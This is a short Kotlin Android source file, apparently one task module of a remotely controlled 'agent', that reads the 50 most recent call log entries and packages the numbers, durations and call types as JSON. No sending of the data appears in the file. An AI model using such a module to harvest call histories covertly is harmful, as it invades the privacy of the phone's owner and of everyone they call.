package com.uranium.agent.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

object CallLogsTask {
    fun execute(context: Context): JSONObject {
        val result = JSONObject()
        val array = JSONArray()
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50")
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("number", if (numIdx >= 0) it.getString(numIdx) else "")
                        put("duration", if (durIdx >= 0) it.getString(durIdx) else "")
                        put("type", if (typeIdx >= 0) it.getInt(typeIdx) else 0)
                    }
                    array.put(obj)
                }
            }
            result.put("calls", array)
        } else {
            result.put("error", "Permission denied")
        }
        return result
    }
}
